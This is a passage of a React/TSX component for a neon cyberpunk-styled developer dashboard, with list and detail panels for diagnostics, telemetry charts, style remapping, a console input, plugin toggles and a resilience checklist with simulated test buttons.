                  </button>
                </div>
              </motion.div>
            ) : (
              /* --- HIGH-DENSITY BRUTALIST LIST VIEW MODE --- */
              <motion.div
                key="list-layout"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 10 }}
                transition={{ duration: 0.25 }}
                className="w-full flex flex-col gap-2.5 py-2"
              >
                <div className="flex justify-between items-center px-1 mb-1">
                  <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">// HIGH_DENSITY_STACKED</span>
                  <span className="text-[9px] font-black text-[#06b6d4] bg-[#06b6d4]/10 px-2 py-0.5 border border-[#06b6d4]/20 rounded">
                    LIST MODE ACTIVE
                  </span>
                </div>

                {/* List Structure */}
                {segments.map((seg, index) => {
                  const Icon = seg.icon;
                  const isActive = activeSegment === seg.id;
                  const isLatest = seg.id === 0;

                  return (
                    <div
                      key={seg.id}
                      onClick={() => handleSegmentSelect(seg.id)}
                      className={`group p-3 border-2 transition-all cursor-pointer flex items-center justify-between hover:translate-x-1 ${
                        isActive
                          ? 'bg-black border-[#06b6d4] text-white shadow-[4px_4px_0px_#06b6d4]'
                          : isLatest
                            ? 'bg-[#020d07] border-emerald-500/40 text-emerald-300 shadow-[4px_4px_0px_rgba(16,185,129,0.3)] hover:border-emerald-500'
                            : 'bg-[#080a10]/60 border-[#1f293d] text-slate-300 hover:border-slate-700'
                      }`}
                    >
                      <div className="flex items-center gap-3 min-w-0">
                        {/* Number Indicator */}
                        <span className="font-mono text-[9px] font-black text-slate-500">
                          0{index + 1}
                        </span>

                        <div className={`p-1.5 rounded-lg border ${
                          isActive
                            ? 'bg-[#06b6d4]/20 border-[#06b6d4]/30 text-[#06b6d4]'
                            : isLatest
                              ? 'bg-emerald-950/50 border-emerald-500/30 text-emerald-400'
                              : 'bg-slate-900 border-slate-800 text-slate-500 group-hover:text-slate-300'
                        }`}>
                          <Icon className="w-4 h-4" />
                        </div>

                        <div className="text-left min-w-0">
                          <h4 className={`text-xs font-black tracking-wide uppercase ${
                            isLatest ? 'text-emerald-400 font-extrabold' : 'text-slate-200'
                          }`}>
                            {seg.title}
                          </h4>
                          <span className="text-[9px] text-slate-500 block truncate leading-tight">
                            {seg.desc}
                          </span>
                        </div>
                      </div>

                      {/* Right Action Trigger */}
                      <div className="flex items-center gap-2">
                        {isLatest && (
                          <span className="text-[8px] bg-emerald-500 text-black px-1.5 py-0.5 rounded font-black uppercase tracking-wider scale-90">
                            PINNED
                          </span>
                        )}
                        <ChevronRight className={`w-4 h-4 transition-transform group-hover:translate-x-0.5 ${
                          isActive ? 'text-[#06b6d4]' : 'text-slate-600'
                        }`} />
                      </div>
                    </div>
                  );
                })}

                {/* --- Return to Wheel Toggle inside List Mode --- */}
                <div className="mt-2 flex justify-end">
                  <button
                    onClick={() => {
                      setIsListView(false);
                      triggerToast('Activated Cyber Wheel Interface');
                    }}
                    className="px-3 py-1.5 rounded border border-[#06b6d4] bg-black text-[#06b6d4] hover:bg-[#06b6d4]/10 transition-all cursor-pointer flex items-center justify-center gap-1.5 text-[8.5px] font-black tracking-wider uppercase shadow-[0_0_10px_rgba(6,182,212,0.3)]"
                  >
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                    <span>Return to Neon Wheel</span>
                  </button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* RIGHT COLUMN: ACTIVE SEGMENT INTERACTIVE BOARD CONTROL */}
        <div className="lg:col-span-6 flex flex-col gap-5">
          <div className="p-5 rounded-2xl border-2 border-[#1f293d]/80 bg-gradient-to-br from-[#05070e] to-[#010205] text-left flex flex-col gap-4 relative">
            
            {/* Cyber-Brutalist corners */}
            <div className="absolute top-[-2px] left-4 w-4 h-1 bg-[#06b6d4]" />
            <div className="absolute bottom-[-2px] right-4 w-4 h-1 bg-[#06b6d4]" />

            {/* Segment Header */}
            <div className="flex items-center justify-between border-b border-[#1f293d]/80 pb-3">
              <div>
                <span className="text-[8.5px] font-mono uppercase tracking-widest text-slate-500">
                  SYSTEM CORE MODULE // SEG_0{activeSegment + 1}
                </span>
                <h3 className="text-sm font-extrabold text-white flex items-center gap-2 uppercase mt-0.5">
                  <span className={`w-2.5 h-2.5 rounded-sm bg-gradient-to-r ${segments[activeSegment].color} animate-pulse`} />
                  {segments[activeSegment].title}
                </h3>
              </div>
              <span className="text-[10px] font-mono text-[#06b6d4] bg-[#06b6d4]/5 border border-[#06b6d4]/20 px-2.5 py-0.5 rounded">
                LINK MAPPED
              </span>
            </div>

            {/* Interactive Control Viewports corresponding to active selection */}
            <div className="flex-1 min-h-[220px]">
              
              {/* INTERACTIVE CONTROLS FOR SEGMENT 0: LATEST FEATURE */}
              {activeSegment === 0 && (
                <div className="flex flex-col gap-4 animate-fadeIn">
                  <p className="text-[11px] text-slate-400 leading-relaxed italic">
                    The latest cutting-edge addition is the <strong className="text-emerald-400">Mythic Intelligence Codex Dialog</strong>. Triggering the core hub opens the narrative chronicle generator and cognitive personality matrix playground.
                  </p>

                  <div className="bg-[#020a06]/50 border border-emerald-500/20 rounded-xl p-4 flex flex-col gap-3">
                    <span className="text-[9px] font-black uppercase text-emerald-400 tracking-wider">
                      Core Hub Synchronization State
                    </span>
                    <div className="grid grid-cols-2 gap-2 text-[10px]">
                      <div className="p-2 bg-black border border-slate-900 rounded-lg">
                        <span className="text-slate-500 block">Status:</span>
                        <span className="font-mono text-emerald-400 font-extrabold flex items-center gap-1">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                          ONLINE_READY
                        </span>
                      </div>
                      <div className="p-2 bg-black border border-slate-900 rounded-lg">
                        <span className="text-slate-500 block">Assigned Sandbox:</span>
                        <span className="font-mono text-white font-extrabold">com.drivelog.ai</span>
                      </div>
                    </div>
                  </div>

                  <button
                    onClick={segments[0].action}
                    className="w-full py-2.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-black text-xs font-black rounded-lg uppercase tracking-wider cursor-pointer shadow-lg shadow-emerald-500/10 active:scale-95 transition-all text-center"
                  >
                    🚀 Trigger Latest Feature
                  </button>
                </div>
              )}

              {/* INTERACTIVE CONTROLS FOR SEGMENT 1: CORE SYSTEMS */}
              {activeSegment === 1 && (
                <div className="flex flex-col gap-4 animate-fadeIn">
                  <p className="text-[11px] text-slate-400 leading-relaxed italic">
                    Verify JTAG termination resistance, monitor active build memory buffers, audit local Gradle structures, and run modular diagnostics.
                  </p>

                  <div className="bg-[#03060d] border border-slate-900 rounded-xl p-3 flex flex-col gap-2 font-mono text-[9.5px]">
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">System Heap status:</span>
                      <span className="text-emerald-400 font-bold">NOMINAL</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">Termination Resist:</span>
                      <span className="text-indigo-400 font-bold">120 Ohm (Match)</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">Compiler Thread State:</span>
                      <span className="text-slate-400">IDLE // STACK_WAIT</span>
                    </div>
                  </div>

                  {/* Diagnostic Mini Logger */}
                  <div className="bg-[#010204] border border-[#1f293d]/50 p-3 rounded-lg flex-1 h-[80px] overflow-y-auto text-[8.5px] font-mono text-slate-400 leading-relaxed scrollbar-none">
                    {sysLogs.map((lg, i) => (
                      <div key={i}>{lg}</div>
                    ))}
                  </div>

                  <button
                    disabled={systemHealth === 'verifying'}
                    onClick={handleRunDiagnostics}
                    className="w-full py-2 bg-slate-900 hover:bg-[#06b6d4]/10 hover:border-[#06b6d4]/40 border border-slate-800 text-white hover:text-[#06b6d4] text-[10.5px] font-bold rounded-lg uppercase tracking-wide cursor-pointer transition-all flex items-center justify-center gap-1.5"
                  >
                    {systemHealth === 'verifying' ? (
                      <>
                        <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#06b6d4]" />
                        <span>Running Core Sweep...</span>
                      </>
                    ) : (
                      <>
                        <Activity className="w-3.5 h-3.5" />
                        <span>Run Core Diagnostics</span>
                      </>
                    )}
                  </button>
                </div>
              )}

              {/* INTERACTIVE CONTROLS FOR SEGMENT 2: TELEMETRY */}
              {activeSegment === 2 && (
                <div className="flex flex-col gap-4 animate-fadeIn">
                  <p className="text-[11px] text-slate-400 leading-relaxed italic">
                    Inspect active emulator pipeline performance, trace execution memory, and verify render times with our dynamic waveform visualizer.
                  </p>

                  {/* Mini Charts */}
                  <div className="grid grid-cols-2 gap-3 text-[10px]">
                    <div className="p-2.5 bg-[#03060c] border border-slate-900 rounded-lg">
                      <div className="flex justify-between text-[#06b6d4] font-mono font-bold mb-1">
                        <span>CPU LOAD:</span>
                        <span>{cpuLoad}%</span>
                      </div>
                      <div className="w-full bg-slate-950 h-2 rounded overflow-hidden">
                        <div className="bg-[#06b6d4] h-full transition-all duration-1000" style={{ width: `${cpuLoad}%` }} />
                      </div>
                    </div>

                    <div className="p-2.5 bg-[#03060c] border border-slate-900 rounded-lg">
                      <div className="flex justify-between text-pink-400 font-mono font-bold mb-1">
                        <span>GPU MEM:</span>
                        <span>{gpuLoad}%</span>
                      </div>
                      <div className="w-full bg-slate-950 h-2 rounded overflow-hidden">
                        <div className="bg-pink-500 h-full transition-all duration-1000" style={{ width: `${gpuLoad}%` }} />
                      </div>
                    </div>
                  </div>

                  {/* Waveform Visualizer */}
                  <div className="bg-black/80 border border-slate-900 rounded-xl p-3 h-28 flex flex-col gap-1.5 relative overflow-hidden">
                    <span className="text-[8.5px] font-mono text-slate-500 uppercase tracking-widest absolute top-2 left-3">
                      WAVEFORM_ANALYSER_FEED (12-BAND)
                    </span>
                    <div className="flex-1 flex items-end justify-center pt-4">
                      <svg className="w-full h-[65px] text-[#06b6d4]" viewBox="0 0 360 90">
                        <polyline
                          fill="none"
                          stroke="currentColor"
                          strokeWidth="2.5"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          points={getWaveformPath()}
                        />
                      </svg>
                    </div>
                  </div>
                </div>
              )}

              {/* INTERACTIVE CONTROLS FOR SEGMENT 3: STYLE REMAPPER */}
              {activeSegment === 3 && (
                <div className="flex flex-col gap-4 animate-fadeIn">
                  <p className="text-[11px] text-slate-400 leading-relaxed italic">
                    Map legacy layouts into Jetpack Compose files. Run the full-scale transformer inside the Multi-Agent lab to compile gorgeous styled interfaces dynamically.
                  </p>

                  <div className="bg-[#07050d] border border-pink-500/10 p-3.5 rounded-xl flex items-center justify-between text-[10px]">
                    <div className="flex items-center gap-2.5">
                      <Palette className="w-4.5 h-4.5 text-pink-400" />
                      <div>
                        <span className="text-white font-bold block">Aesthetic Style Transfer</span>
                        <span className="text-slate-500 text-[8.5px]">Brutalist • Neon • Cyberpunk • Cozy</span>
                      </div>
                    </div>
                    <span className="text-[8.5px] font-mono text-pink-400 bg-pink-950/30 border border-pink-500/20 px-2 py-0.5 rounded">
                      TRANSFORM_READY
                    </span>
                  </div>

                  {/* Simulated Code Transformation Panel */}
                  <div className="bg-black border border-slate-900 rounded-lg p-3 font-mono text-[8.5px] text-slate-400">
                    <div className="text-slate-600">// XML Input to Compose Kotlin Compiler Output</div>
                    <div className="mt-1 text-red-400">&lt;TextView android:id="@+id/statusLabel" android:text="Active" /&gt;</div>
                    <div className="text-yellow-400">--&gt; Remapping aesthetics to Cyberpunk...</div>
                    <div className="text-emerald-400">Text("Active", modifier = Modifier.neonGlow().padding(8.dp))</div>
                  </div>

                  <button
                    onClick={segments[3].action}
                    className="w-full py-2 bg-pink-950/30 hover:bg-pink-900/30 border border-pink-500/20 text-pink-400 text-[10.5px] font-bold rounded-lg uppercase tracking-wide cursor-pointer transition-all flex items-center justify-center gap-1.5"
                  >
                    <Sparkles className="w-3.5 h-3.5" />
                    <span>Launch AI Style Remapper Tab</span>
                  </button>
                </div>
              )}

              {/* INTERACTIVE CONTROLS FOR SEGMENT 4: CYBER CONSOLE */}
              {activeSegment === 4 && (
                <div className="flex flex-col gap-3 animate-fadeIn">
                  <p className="text-[11px] text-slate-400 leading-relaxed italic">
                    Hardware probes terminal. Interrogate the underlying Android environment, inspect logs, and inject active commands.
                  </p>

                  {/* Active Shell Feed */}
                  <div className="bg-[#020306] border border-[#1f293d]/60 p-3 rounded-lg h-28 overflow-y-auto font-mono text-[9px] text-[#06b6d4] leading-relaxed scrollbar-none flex flex-col gap-1">
                    {consoleLogs.map((log, i) => (
                      <div key={i}>{log}</div>
                    ))}
                  </div>

                  {/* Input form */}
                  <form onSubmit={handleConsoleSubmit} className="flex gap-2">
                    <input
                      type="text"
                      placeholder="Type command (e.g. 'probe', 'cpu', 'sys_sweep')..."
                      value={consoleInput}
                      onChange={e => setConsoleInput(e.target.value)}
                      className="flex-1 bg-black border border-[#1f293d]/80 rounded-lg px-3 py-1.5 text-[10px] font-mono text-white outline-none focus:border-[#06b6d4]"
                    />
                    <button
                      type="submit"
                      className="px-3 py-1.5 bg-[#06b6d4] text-black font-black text-[10px] rounded-lg uppercase tracking-wider cursor-pointer hover:bg-[#05a0bc] transition-colors"
                    >
                      EXEC
                    </button>
                  </form>
                </div>
              )}

              {/* INTERACTIVE CONTROLS FOR SEGMENT 5: MODULES & EXTENSIONS */}
              {activeSegment === 5 && (
                <div className="flex flex-col gap-3 animate-fadeIn">
                  <p className="text-[11px] text-slate-400 leading-relaxed italic">
                    Structure plugins, modify cognitive agent routing models, and scale local sandboxes with autonomous extension routines.
                  </p>

                  <div className="flex flex-col gap-2">
                    {plugins.map(plg => (
                      <div key={plg.id} className="p-2.5 bg-black border border-slate-900 rounded-lg flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <div className={`w-2 h-2 rounded-full ${plg.enabled ? 'bg-[#06b6d4]' : 'bg-slate-700'}`} />
                          <div className="text-[10px]">
                            <span className="font-extrabold text-white block">{plg.name}</span>
                            <span className="text-[8px] text-slate-500 font-mono uppercase tracking-wider">{plg.type}</span>
                          </div>
                        </div>

                        <button
                          onClick={() => {
                            setPlugins(prev =>
                              prev.map(p => (p.id === plg.id ? { ...p, enabled: !p.enabled } : p))
                            );
                            triggerToast(`${plg.name} ${!plg.enabled ? 'activated' : 'deactivated'}`);
                          }}
                          className={`px-2 py-1 border rounded text-[8.5px] font-black cursor-pointer transition-all ${
                            plg.enabled
                              ? 'bg-[#06b6d4]/10 border-[#06b6d4]/30 text-[#06b6d4]'
                              : 'bg-slate-900 border-slate-800 text-slate-500'
                          }`}
                        >
                          {plg.enabled ? 'ACTIVE' : 'OFFLINE'}
                        </button>
                      </div>
                    ))}
                  </div>

                  <button
                    onClick={() => {
                      setActiveDialog('decentralizedSwarm');
                      triggerToast('Opening Decentralized Swarm Simulator!');
                    }}
                    className="w-full py-2 bg-[#06b6d4]/10 hover:bg-[#06b6d4]/20 border border-[#06b6d4]/30 text-[#06b6d4] text-[10.5px] font-bold rounded-lg uppercase tracking-wide cursor-pointer transition-all flex items-center justify-center gap-1.5 mt-2"
                  >
                    <Cpu className="w-3.5 h-3.5 animate-spin" />
                    <span>Launch Decentralized Swarm Simulator</span>
                  </button>
                </div>
              )}

              {/* INTERACTIVE CONTROLS FOR SEGMENT 6: USER SPACE */}
              {activeSegment === 6 && (
                <div className="flex flex-col gap-3 animate-fadeIn text-slate-300">
                  <p className="text-[11px] text-slate-400 leading-relaxed italic">
                    Fine-tune Style DNA configurations, modify motion dynamics, and adapt physical layout stiffness constants.
                  </p>

                  <div className="flex flex-col gap-2.5 bg-black border border-slate-900 rounded-xl p-3">
                    {/* Slider Neon */}
                    <div>
                      <div className="flex justify-between text-[10px] text-slate-400 mb-0.5">
                        <span>Aesthetic Glow Force:</span>
                        <span className="font-mono text-[#06b6d4]">{styleDnaNeon}%</span>
                      </div>
                      <input
                        type="range"
                        min="20"
                        max="100"
                        value={styleDnaNeon}
                        onChange={e => setStyleDnaNeon(Number(e.target.value))}
                        className="w-full accent-[#06b6d4] cursor-pointer h-1 rounded"
                      />
                    </div>

                    {/* Slider Border Radius */}
                    <div>
                      <div className="flex justify-between text-[10px] text-slate-400 mb-0.5">
                        <span>Border Corner Curvature:</span>
                        <span className="font-mono text-[#06b6d4]">{styleDnaRadius}dp</span>
                      </div>
                      <input
                        type="range"
                        min="0"
                        max="24"
                        value={styleDnaRadius}
                        onChange={e => setStyleDnaRadius(Number(e.target.value))}
                        className="w-full accent-[#06b6d4] cursor-pointer h-1 rounded"
                      />
                    </div>

                    {/* Slider Motion */}
                    <div>
                      <div className="flex justify-between text-[10px] text-slate-400 mb-0.5">
                        <span>Spring Stiffness Rate:</span>
                        <span className="font-mono text-[#06b6d4]">{styleDnaMotion}f</span>
                      </div>
                      <input
                        type="range"
                        min="100"
                        max="1500"
                        value={styleDnaMotion * 15}
                        onChange={e => setStyleDnaMotion(Math.floor(Number(e.target.value) / 15))}
                        className="w-full accent-[#06b6d4] cursor-pointer h-1 rounded"
                      />
                    </div>
                  </div>
                </div>
              )}

              {/* INTERACTIVE CONTROLS FOR SEGMENT 7: RELIABILITY & RESILIENCE */}
              {activeSegment === 7 && (
                <div className="flex flex-col gap-3 animate-fadeIn text-slate-300">
                  {/* Segment 7 Tab Headers */}
                  <div className="grid grid-cols-4 bg-[#030712]/90 p-0.5 rounded-lg border border-[#1f293d]/60 font-mono text-[7.5px] select-none shrink-0 gap-0.5">
                    <button
                      onClick={() => setResilienceTab('telemetry')}
                      className={`py-1.5 text-center rounded transition-all uppercase font-bold cursor-pointer ${
                        resilienceTab === 'telemetry' ? 'bg-[#06b6d4]/10 text-[#06b6d4] border border-[#06b6d4]/20' : 'text-slate-500 hover:text-slate-300'
                      }`}
                    >
                      1. Telemetry
                    </button>
                    <button
                      onClick={() => setResilienceTab('checklist')}
                      className={`py-1.5 text-center rounded transition-all uppercase font-bold cursor-pointer ${
                        resilienceTab === 'checklist' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'text-slate-500 hover:text-slate-300'
                      }`}
                    >
                      2. Shield Matrix
                    </button>
                    <button
                      onClick={() => setResilienceTab('ghosts')}
                      className={`py-1.5 text-center rounded transition-all uppercase font-bold cursor-pointer ${
                        resilienceTab === 'ghosts' ? 'bg-violet-500/10 text-violet-400 border border-violet-500/20' : 'text-slate-500 hover:text-slate-300'
                      }`}
                    >
                      3. Ghost Fusion
                    </button>
                    <button
                      onClick={() => setResilienceTab('tuning')}
                      className={`py-1.5 text-center rounded transition-all uppercase font-bold cursor-pointer ${
                        resilienceTab === 'tuning' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20' : 'text-slate-500 hover:text-slate-300'
                      }`}
                    >
                      4. Tune Params
                    </button>
                  </div>

                  {/* TAB 1: TELEMETRY STATS */}
                  {resilienceTab === 'telemetry' && (
                    <>
                      {/* Active Quota Pressure & Real-time Metrics */}
                      <div className="grid grid-cols-2 gap-2 text-[10px]">
                        <div className="p-2.5 bg-black border border-[#1f293d]/60 rounded-lg flex flex-col gap-1">
                          <span className="text-slate-500 uppercase text-[8px] tracking-wider font-mono">Remaining Credits</span>
                          <span className="text-white font-mono font-bold text-sm">
                            {telemetry?.quotaPressure?.remainingQuota ?? 1000} cr
                          </span>
                          <div className="w-full bg-slate-900 h-1 rounded overflow-hidden mt-1">
                            <div
                              className="bg-emerald-500 h-full transition-all duration-500"
                              style={{ width: `${Math.min(100, ((telemetry?.quotaPressure?.remainingQuota ?? 1000) / 1000) * 100)}%` }}
                            />
                          </div>
                        </div>

                        <div className="p-2.5 bg-black border border-[#1f293d]/60 rounded-lg flex flex-col gap-1">
                          <span className="text-slate-500 uppercase text-[8px] tracking-wider font-mono">Model Burn Rate</span>
                          <span className="text-amber-400 font-mono font-bold text-sm flex items-center gap-1">
                            {telemetry?.quotaPressure?.burnRate ?? 1.2} <span className="text-[9px] text-slate-500 font-normal">cr/min</span>
                          </span>
                          <span className="text-[8px] text-slate-400 mt-1 truncate">
                            Exhaustion: {telemetry?.quotaPressure?.predictedExhaustionMin ?? 816} min
                          </span>
                        </div>
                      </div>

                      {/* Model Health Matrix table */}
                      <div className="bg-[#020305] border border-[#1f293d]/50 rounded-xl p-2.5">
                        <span className="text-[8px] font-mono text-slate-500 uppercase tracking-widest block mb-1.5">
                          DYNAMIC_MODEL_HEALTH_MATRIX
                        </span>
                        <div className="flex flex-col gap-1 max-h-[105px] overflow-y-auto scrollbar-none">
                          {telemetry && Object.entries(telemetry.modelHealth).map(([mName, met]: any) => (
                            <div key={mName} className="flex justify-between items-center text-[9px] font-mono p-1 border-b border-slate-950">
                              <span className="text-slate-300 font-semibold truncate max-w-[130px]">{mName}</span>
                              <div className="flex items-center gap-2">
                                <span className={`text-[8px] px-1 rounded-sm uppercase ${
                                  met.status === 'operational' ? 'bg-emerald-950/40 text-emerald-400 border border-emerald-500/20' :
                                  met.status === 'degraded' ? 'bg-amber-950/40 text-amber-400 border border-amber-500/20' :
                                  'bg-red-950/40 text-red-400 border border-red-500/20'
                                }`}>
                                  {met.status}
                                </span>
                                <span className="text-slate-400 w-8 text-right">{met.availability}%</span>
                                <span className="text-indigo-400 w-11 text-right">{met.avgLatency}ms</span>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Recent Rotation Logs */}
                      <div className="bg-[#010204] border border-[#1f293d]/50 p-2 rounded-lg flex-1 h-[75px] overflow-y-auto text-[8px] font-mono text-slate-400 leading-relaxed scrollbar-none flex flex-col gap-0.5">
                        <div className="text-slate-500 font-bold border-b border-slate-900 pb-0.5 mb-1 flex justify-between">
                          <span>ROTATION EVENT TELEMETRY LOGGER</span>
                          <span className="text-[#06b6d4]">ONLINE</span>
                        </div>
                        {telemetry?.rotationEvents?.map((evt: any) => (
                          <div key={evt.id} className="flex justify-between gap-1 text-[7.5px] border-b border-slate-950/20 pb-0.5">
                            <span className="text-amber-400 truncate max-w-[110px]">{evt.activeModel} ➔ {evt.nextModel}</span>
                            <span className="text-red-400 truncate max-w-[90px]">{evt.errorCode}</span>
                            <span className="text-slate-500">{new Date(evt.timestamp).toLocaleTimeString()}</span>
                          </div>
                        ))}
                      </div>

                      {/* Adversarial Stress-testing suite */}
                      <div className="flex flex-col gap-1.5 mt-1">
                        <span className="text-[8px] font-mono text-slate-500 uppercase tracking-widest block">
                          ADVERSARIAL_STRESS_TEST_SUITE
                        </span>
                        <div className="grid grid-cols-3 gap-2">
                          <button
                            disabled={isStressTesting}
                            onClick={() => handleTriggerStressTest('concurrency')}
                            className="py-1 px-1 bg-gradient-to-r from-cyan-950/30 to-blue-950/30 hover:from-cyan-900/40 hover:to-blue-900/40 border border-cyan-500/20 hover:border-cyan-400 text-cyan-400 hover:text-cyan-300 text-[8.5px] font-bold rounded uppercase tracking-wider transition-all cursor-pointer"
                          >
                            Concurrency
                          </button>
                          <button
                            disabled={isStressTesting}
                            onClick={() => handleTriggerStressTest('chaos')}
                            className="py-1 px-1 bg-gradient-to-r from-purple-950/30 to-fuchsia-950/30 hover:from-purple-900/40 hover:to-fuchsia-900/40 border border-purple-500/20 hover:border-purple-400 text-purple-400 hover:text-purple-300 text-[8.5px] font-bold rounded uppercase tracking-wider transition-all cursor-pointer"
                          >
                            Chaos Model
                          </button>
                          <button
                            disabled={isStressTesting}
                            onClick={() => handleTriggerStressTest('quota')}
                            className="py-1 px-1 bg-gradient-to-r from-red-950/30 to-amber-950/30 hover:from-red-900/40 hover:to-amber-900/40 border border-red-500/20 hover:border-red-400 text-red-400 hover:text-red-300 text-[8.5px] font-bold rounded uppercase tracking-wider transition-all cursor-pointer"
                          >
                            Quota Drain
                          </button>
                        </div>
                      </div>
                    </>
                  )}

                  {/* TAB 2: BULLET-PROOF SHIELD MATRIX CHECKLIST */}
                  {resilienceTab === 'checklist' && (
                    <div className="flex flex-col gap-2">
                      <div className="grid grid-cols-1 gap-1.5 max-h-[175px] overflow-y-auto scrollbar-none pr-0.5">
                        {/* 1. Fault Tolerance */}
                        <div className="p-2 bg-[#010204]/80 border border-slate-900/60 rounded-md flex items-center justify-between text-[9.5px]">
                          <div className="flex flex-col gap-0.5">
                            <span className="font-extrabold text-slate-200 flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                              1. Fault Tolerance [ACTIVE]
                            </span>
                            <span className="text-[8px] text-slate-500 font-mono">Dynamic fallback rotators & self-healing retry</span>
                          </div>
                          <button
                            disabled={isTestingChecklist !== null}
                            onClick={runFaultToleranceSimulation}
                            className="px-2 py-1 border border-amber-500/30 text-amber-400 bg-amber-500/5 hover:bg-amber-500/10 text-[8px] font-mono rounded cursor-pointer transition-colors"
                          >
                            {isTestingChecklist === 'fault' ? 'TESTING...' : 'TRIGGER FAIL'}
                          </button>
                        </div>

                        {/* 2. Defensive Coding */}
                        <div className="p-2 bg-[#010204]/80 border border-slate-900/60 rounded-md flex items-center justify-between text-[9.5px]">
                          <div className="flex flex-col gap-0.5">
                            <span className="font-extrabold text-slate-200 flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                              2. Defensive Coding [ACTIVE]
                            </span>
                            <span className="text-[8px] text-slate-500 font-mono">Incoming SQL injection & script sanitizer filters</span>
                          </div>
                          <button
                            disabled={isTestingChecklist !== null}
                            onClick={runDefensiveCodingSimulation}
                            className="px-2 py-1 border border-[#06b6d4]/30 text-[#06b6d4] bg-[#06b6d4]/5 hover:bg-[#06b6d4]/10 text-[8px] font-mono rounded cursor-pointer transition-colors"
                          >
                            {isTestingChecklist === 'defensive' ? 'TESTING...' : 'TEST BUFFER'}
                          </button>
                        </div>

                        {/* 3. Observability */}
                        <div className="p-2 bg-[#010204]/80 border border-slate-900/60 rounded-md flex items-center justify-between text-[9.5px]">
                          <div className="flex flex-col gap-0.5">
                            <span className="font-extrabold text-slate-200 flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                              3. Observability [ACTIVE]
                            </span>
                            <span className="text-[8px] text-slate-500 font-mono">High-density telemetry streams & model health logs</span>
                          </div>
                          <button
                            disabled={isTestingChecklist !== null}
                            onClick={runObservabilitySimulation}
                            className="px-2 py-1 border border-indigo-500/30 text-indigo-400 bg-indigo-500/5 hover:bg-indigo-500/10 text-[8px] font-mono rounded cursor-pointer transition-colors"
                          >
                            {isTestingChecklist === 'observability' ? 'SYNCING...' : 'POLL METRICS'}
                          </button>
                        </div>

                        {/* 4. Self-Healing */}
                        <div className="p-2 bg-[#010204]/80 border border-slate-900/60 rounded-md flex items-center justify-between text-[9.5px]">
                          <div className="flex flex-col gap-0.5">
                            <span className="font-extrabold text-slate-200 flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                              4. Self-Healing [ACTIVE]
                            </span>
                            <span className="text-[8px] text-slate-500 font-mono">Auto schema diagnostics and state corruption repair</span>
                          </div>
                          <button
                            disabled={isTestingChecklist !== null}
                            onClick={runSelfHealingSimulation}
                            className="px-2 py-1 border border-rose-500/30 text-rose-400 bg-rose-500/5 hover:bg-rose-500/10 text-[8px] font-mono rounded cursor-pointer transition-colors"
                          >
                            {isTestingChecklist === 'selfhealing' ? 'REPAIRING...' : 'CORRUPT & HEAL'}
                          </button>
                        </div>

                        {/* 5. Zero-Trust Security */}
                        <div className="p-2 bg-[#010204]/80 border border-slate-900/60 rounded-md flex items-center justify-between text-[9.5px]">
                          <div className="flex flex-col gap-0.5">
                            <span className="font-extrabold text-slate-200 flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                              5. Zero-Trust Security [ACTIVE]
                            </span>
                            <span className="text-[8px] text-slate-500 font-mono">E2E dynamic HMAC payload signature handshake</span>
                          </div>
                          <button
                            disabled={isTestingChecklist !== null}
                            onClick={runZeroTrustSimulation}
                            className="px-2 py-1 border border-violet-500/30 text-violet-400 bg-violet-500/5 hover:bg-violet-500/10 text-[8px] font-mono rounded cursor-pointer transition-colors"
                          >
                            {isTestingChecklist === 'zerotrust' ? 'SIGNING...' : 'CHALLENGE'}
                          </button>
                        </div>

                        {/* 6. Performance Stability */}
                        <div className="p-2 bg-[#010204]/80 border border-slate-900/60 rounded-md flex items-center justify-between text-[9.5px]">
                          <div className="flex flex-col gap-0.5">
                            <span className="font-extrabold text-slate-200 flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                              6. Performance Stability [ACTIVE]
                            </span>
                            <span className="text-[8px] text-slate-500 font-mono">Dynamic queue pacing & client throttlers</span>
                          </div>
                          <button
                            disabled={isTestingChecklist !== null}
                            onClick={runPerformanceSimulation}
                            className="px-2 py-1 border border-cyan-500/30 text-cyan-400 bg-cyan-500/5 hover:bg-cyan-500/10 text-[8px] font-mono rounded cursor-pointer transition-colors"
                          >
                            {isTestingChecklist === 'performance' ? 'STABILIZING...' : 'BURST TEST'}
                          </button>
                        </div>

                        {/* 7. Resilient Deployment */}
                        <div className="p-2 bg-[#010204]/80 border border-slate-900/60 rounded-md flex items-center justify-between text-[9.5px]">
                          <div className="flex flex-col gap-0.5">
                            <span className="font-extrabold text-slate-200 flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                              7. Resilient Deployment [ACTIVE]
                            </span>
                            <span className="text-[8px] text-slate-500 font-mono">Pre-flight system integrity & configuration checks</span>
                          </div>
                          <button
                            disabled={isTestingChecklist !== null}
                            onClick={runDeploymentSimulation}
                            className="px-2 py-1 border border-teal-500/30 text-teal-400 bg-teal-500/5 hover:bg-teal-500/10 text-[8px] font-mono rounded cursor-pointer transition-colors"
                          >
                            {isTestingChecklist === 'deployment' ? 'RUNNING SWEEP...' : 'RUN PRE-FLIGHT'}
                          </button>
